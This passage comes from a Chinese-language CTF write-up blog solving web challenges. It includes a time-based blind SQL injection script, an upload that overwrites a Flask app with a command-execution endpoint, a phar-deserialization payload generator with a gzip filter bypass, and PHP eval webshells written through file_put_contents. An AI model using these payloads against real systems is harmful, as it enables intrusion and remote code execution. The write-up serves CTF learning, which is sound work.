class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$result</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>没给waf，但是好像没什么waf，不知道有什么黑魔法，第一个字符我用大于小于手动出来是<code>c</code>，但是我用等号吧，他又不延时</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://79972a33-c957-4446-a719-2f9e743e59a8.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">DELAY_THRESHOLD=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) //<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&#x27;&#x27;&#x27;if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># ctf</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&quot;</span></span><br><span class="line">        <span class="comment"># items</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(&#x27;ctf&#x27;)and(table_name)like(&#x27;items&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&quot;</span></span><br><span class="line">        <span class="comment"># id,name,price</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(id,name,price))from(items)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select/**/group_concat(id,0x2c,name,0x2c,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select/**/concat_ws(0x2c,id,name,price)/**/from/**/ctf.items/**/limit/**/2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),0)%23&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(url+<span class="string">&quot;?id=&quot;</span>+payload)</span><br><span class="line">        request_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request_time &gt;= DELAY_THRESHOLD:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Delay triggered! ASCII &gt; <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;No delay. ASCII &lt;= <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head !=<span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>纳尼，居然注入不出来flag，我在想这个东西还科不科学了</p><h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p>开启了debug模式直接覆盖掉<code>app.py</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary2Ll9uYmCfKuKAWRn</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81/upload</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>708</span><br><span class="line"></span><br><span class="line"><span class="language-python">------WebKitFormBoundary2Ll9uYmCfKuKAWRn</span></span><br><span class="line"><span class="language-python">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;app.py&quot;</span></span></span><br><span class="line"><span class="language-python">Content-<span class="type">Type</span>: text/plain</span></span><br><span class="line"><span class="language-python"></span></span><br><span class="line"><span class="language-python"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span></span><br><span class="line"><span class="language-python"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-python">app = Flask(__name__)</span></span><br><span class="line"><span class="language-python"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span></span><br><span class="line"><span class="language-python"><span class="keyword">def</span> <span class="title function_">index</span>():    </span></span><br><span class="line"><span class="language-python">    <span class="keyword">try</span>:        </span></span><br><span class="line"><span class="language-python">        cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)        </span></span><br><span class="line"><span class="language-python">        data = os.popen(cmd).read()        </span></span><br><span class="line"><span class="language-python">        <span class="keyword">return</span> data    </span></span><br><span class="line"><span class="language-python">    <span class="keyword">except</span>:        </span></span><br><span class="line"><span class="language-python">        <span class="keyword">pass</span>    </span></span><br><span class="line"><span class="language-python">        </span></span><br><span class="line"><span class="language-python">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-python"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:    </span></span><br><span class="line"><span class="language-python">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span></span><br><span class="line"><span class="language-python"></span></span><br><span class="line"><span class="language-python">------WebKitFormBoundary2Ll9uYmCfKuKAWRn--</span></span><br><span class="line"><span class="language-python"></span></span><br></pre></td></tr></table></figure><p>传好之后直接R就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat%20/flag</span><br></pre></td></tr></table></figure><h2 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以phar反序列化，写个木马就行了，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; <span class="keyword">public</span> <span class="variable">$cmd</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;phar.readonly&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;a.txt&#x27;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?php @eval(\$_POST[1]);&#x27; &gt; /var/www/html/shell.php&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;phar.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>压缩成gz绕过<code>!preg_match(&quot;/__HALT_COMPILER/i&quot;,FILE_CONTENTS)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -c phar.jpg &gt; exp.phar.gz</span><br></pre></td></tr></table></figure><p>上传上去</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryPASYrqSA9GBt07ei</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81/index.php</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>837</span><br><span class="line"></span><br><span class="line"><span class="language-wren"><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="title class_">WebKitFormBoundaryPASYrq</span>SA9GBt07ei</span></span><br><span class="line"><span class="language-wren"><span class="title class_">Content</span><span class="operator">-</span><span class="title class_">Disposition</span>: form<span class="operator">-</span><span class="variable">data</span>; <span class="variable">name</span><span class="operator">=</span><span class="string">&quot;file&quot;</span>; <span class="variable">filename</span><span class="operator">=</span><span class="string">&quot;exp.jpg&quot;</span></span></span><br><span class="line"><span class="language-wren"><span class="title class_">Content</span><span class="operator">-</span><span class="title class_">Type</span>: <span class="variable">image</span>/<span class="title function_">jpeg</span></span></span><br><span class="line"><span class="language-wren"></span></span><br><span class="line"><span class="language-wren">&#123;&#123;<span class="title function_">unquote</span>(<span class="string">&quot;\x1f\x8b<span class="char escape_">\x08</span><span class="char escape_">\x08</span>7\x0d<span class="char escape_">\x97</span>h<span class="char escape_">\x00</span><span class="char escape_">\x03</span>phar.jpg<span class="char escape_">\x00</span>s\xf7t\xb3\xb0L\xb4\xb1/\xc8<span class="char escape_">\x28</span>P<span class="char escape_">\x88</span>\x8f\xf7p\xf4<span class="char escape_">\x09</span><span class="char escape_">\x89</span>w\xf6\xf7\x0d\xf0\xf4q\x0d\xd2\xd0\xb4V\xb0\xb7\xe3\xe5\xeaa```<span class="char escape_">\x04</span>bA<span class="char escape_">\x28</span>\xcd\xc0<span class="char escape_">\x10</span><span class="char escape_">\x09</span>\xc4\xfeV&amp;VJn9<span class="char escape_">\x89</span>\xe9JV<span class="char escape_">\x86</span>V\xd5\xc5V\xc6VJ\xc9\xb9<span class="char escape_">\x29</span>J\xd6\xc5V\xa6fVJ\xa9\xc9<span class="char escape_">\x19</span>\xf9\x0a\xea<span class="char escape_">\x10</span>c\x1dR\xcb<span class="char escape_">\x12</span>s4T\xe2<span class="char escape_">\x03</span>\xfc<span class="char escape_">\x83</span>C\xa2\x0dc5\xad\xd5<span class="char escape_">\x15</span>\xec<span class="char escape_">\x14</span>\xf4\xcb<span class="char escape_">\x12</span>\x8b\xf4\xcb\xcb\xcb\xf53Jrs\xf4\x8b3Rsr\xf4<span class="char escape_">\x80</span>\x8a<span class="char escape_">\x95</span>\xackY<span class="char escape_">\x81</span><span class="char escape_">\x86</span>&#x27;\xea<span class="char escape_">\x95</span>T<span class="char escape_">\x94</span><span class="char escape_">\x80</span>\xec2\xe7\x9d\x9e<span class="char escape_">\x01</span>\xa2\x9b\xc5\xee\xf4l<span class="char escape_">\x83</span>X\xceP\xc1\xb1<span class="char escape_">\x84</span>W\xceqj\x9d\xdb\xb7\xa5\xe7\xb4W\xab\xf2_\xb6mxo\xc2<span class="char escape_">\x04</span><span class="char escape_">\x94</span>pw\xf2u<span class="char escape_">\x02</span><span class="char escape_">\x00</span>\x1e\xf6\xb4<span class="char escape_">\x95</span>\xd0<span class="char escape_">\x00</span><span class="char escape_">\x00</span><span class="char escape_">\x00</span>&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="language-wren"><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="title class_">WebKitFormBoundaryPASYrq</span>SA9GBt07ei<span class="operator">-</span><span class="operator">-</span></span></span><br><span class="line"><span class="language-wren"></span></span><br></pre></td></tr></table></figure><p>就成功getshell了</p><h2 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;多吃雪梨&#x27;</span>;</span><br><span class="line">&#125; 多吃雪梨</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>绕过wakeup就可以任意执行命令了，通过<code>file_put_contents</code>写入，但是有很明显的非预期</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pairing.php?pear=/var/www/html/shell.php&amp;apple=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>87f4ec66-e850-47fc-a734-116600759b85.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>looklook=pairing.php</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-llvm"><span class="variable">%3</span><span class="keyword">c</span><span class="variable">%3</span>f<span class="variable">%70</span><span class="variable">%68</span><span class="variable">%70</span><span class="variable">%20</span><span class="variable">%40</span><span class="variable">%65</span><span class="variable">%76</span><span class="variable">%61</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%28</span><span class="variable">%24</span><span class="variable">%5</span>f<span class="variable">%50</span><span class="variable">%4</span>f<span class="variable">%53</span><span class="variable">%54</span><span class="variable">%5</span>b<span class="variable">%31</span><span class="variable">%5</span>d<span class="variable">%29</span><span class="variable">%3</span>b</span></span><br></pre></td></tr></table></figure><p>预期的话就是修改属性数量去绕过wakeup实现getshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span> = <span class="string">&#x27;admin&#x27;</span>, <span class="variable">$pass</span> = <span class="literal">null</span>, <span class="variable">$eating</span> = <span class="string">&quot;echo &#x27;&lt;?php @eval(\$_POST[1]);&#x27; &gt; /var/www/html/test.php&quot;</span>, <span class="variable">$God</span> = <span class="string">&#x27;true&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user   = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass   = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating = <span class="variable">$eating</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;God    = <span 